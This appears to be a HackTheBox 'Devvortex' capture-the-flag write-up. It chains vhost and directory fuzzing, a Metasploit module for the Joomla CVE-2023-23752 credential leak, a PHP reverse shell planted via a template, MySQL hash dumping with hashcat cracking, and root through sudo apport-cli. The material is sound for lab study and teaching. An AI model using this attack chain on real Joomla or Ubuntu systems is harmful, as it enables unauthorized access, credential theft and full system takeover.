***Key Take Aways***
*Vhost enumeration*
*MSF*
*password reuse*
*how to cause NIX crashes*


**Nmap Scan Results:**

```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

**Vhost Fuzzing**

```
ffuf -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 4 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 4
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 7408ms]

```
**Directory Busting the Vhost**
```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 $URL

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://dev.devvortex.htb/FUZZ
Total requests: 37050

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                  
=====================================================================

000000001:   200        501 L    1581 W     23221 Ch    "index.php"                                              
000000006:   200        339 L    2968 W     18092 Ch    "LICENSE.txt"                                            
000000157:   403        7 L      10 W       162 Ch      ".htaccess"                                              
000000248:   200        29 L     105 W      764 Ch      "robots.txt"                                             
000000379:   200        501 L    1581 W     23221 Ch    "."                                                                                                    
000000693:   200        0 L      0 W        0 Ch        "configuration.php"                                      
000001178:   200        74 L     540 W      4940 Ch     "README.txt"                                                                                        
000001631:   200        172 L    1008 W     6858 Ch     "htaccess.txt" 
```
Visiting the robots.txt and README.txt we get to know that it's a Joomla CMS version < 4.2.8

**Metasploit for unauthorized information disclosure - CVE-2023-23752**


```
use scanner/http/joomla_api_improper_access_checks
show options
set rhosts dev.devvortex.htb
run
```
it drops the local db user and password which we can use to login at /administration endpoint mentioned in robots.txt .

after loggig in navigate to settings>administrator templates.

replace any php template with php-reverse-shell.php and access the same via a GET call for a shell to be returned .

** User Own **
since we do know the local db user and password, we can reuse them and login to the local mysql db for further recon.

```
$ mysql -u 'dbuser' -p 'dbpassword'
$ show databases;
$ use joomla;
$ select * from xxx-users;
```
we will be getting the bcrypt hash for the actual user on the machine which can be cracked via hashcat as mentioned below

```
hashcat -a 0 -m 3200 hash1.txt /usr/share/wordlists/rockyou.txt
```

now we can login via ssh and retrieve the user flag.

**Privilege Escalation**

```
$ sudo -l
  sudo -l 
Matching Defaults entries for User on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

apport-cli can be exploited via causing a crash and viewing the crash file

```
$ sleep 60 &
$ kill -SIGSEGV *PID*
$ sudo /usr/bin/apport-cli -c /var/crash/*crashfile*
```
when the apportcli loads press V to view the crash file and once it loads enter ```:!/bin/bash ``` to get the root bash access
Now we can retrieve the root flag
